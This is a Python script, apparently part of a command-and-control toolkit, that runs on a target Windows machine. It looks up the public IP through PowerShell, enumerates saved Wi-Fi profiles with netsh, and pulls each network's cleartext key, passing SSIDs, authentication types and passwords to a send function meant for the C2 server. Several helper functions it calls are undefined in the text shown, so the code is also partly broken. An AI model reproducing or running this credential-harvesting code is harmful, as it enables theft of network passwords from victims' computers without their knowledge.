#!/usr/bin/python3

import subprocess              # libray which enables us to use trgt OS command in C2 server

import sys


# Getting wan/public IP 
def wan_ip():

	p = subprocess.Popen(["powershell.exe", "(Invoke-WebRequest ifconfig.me/ip).Content.Trim()"], stdout=subprocess.PIPE)
	
	out = p.communicate()[0]  #  extracting the wan ip

	out = out.decode('utf-8') # decoding 

	out = out.rstrip("\r\n")  # stripping off EOL 

	return out

# Main portion
def Main():

	global data

	# list of commands to list down available SSID names
	l1 = ['netsh', 'wlan', 'show', 'profiles']

	creds = [] # creating empty list

	data = subprocess.check_output(l1).decode('utf-8')
	data = data.split('\n') # making list


	# Getting SSID
	for i in data:

		if "All User Profile" in i:

			u_profiles= []

			u_profile = i.split(":")[1][1:-1] # stripping out SSID name

			u_profiles.append(u_profile)
			#print(u_profiles)

			# Getting wifi network profiles
			for j in u_profiles:

				l2 = ['netsh', 'wlan', 'show', 'profile', j, 'key=clear']

				results = subprocess.check_output(l2).decode('utf-8')
				results = results.split('\n') # making list

				# Getting wifi network creds
				for cred in results:

					# Credentials parameters
					auth = "Authentication"
					mode = "Cipher"
					key = "Security key"
					passwd = "Key Content"
					ssid = "SSID name"
					name = "Name"

					if name in cred:

						creds = cred.split(":")[1][1:-1]
						send_eff(colored("++++++++++++++++++++++++++++++++++++++",'green'))
						send_eff("|", name,":",creds,"|")
						send_eff(colored("++++++++++++++++++++++++++++++++++++++",'green'))

					if ssid in cred:

						creds = cred.split(":")[1][1:-1]
						send_eff(ssid,":",creds)

					if auth in cred:

						creds = cred.split(":")[1][1:-1]
						send_eff(auth,":",creds)

					if mode in cred:

						creds = cred.split(":")[1][1:-1]

						if creds != "None":
							
							print(mode,":",creds)

						else:

							print(mode,":",creds)
							print("-"*50)

							continue

					if key in cred:

						creds = cred.split(":")[1][1:-1]

						if creds != "Absent":
							
							print(key,":",creds)

						else:

							continue 


					if passwd in cred:

						creds = cred.split(":")[1][1:-1]
						print(passwd,":",creds)
						print("-"*50)


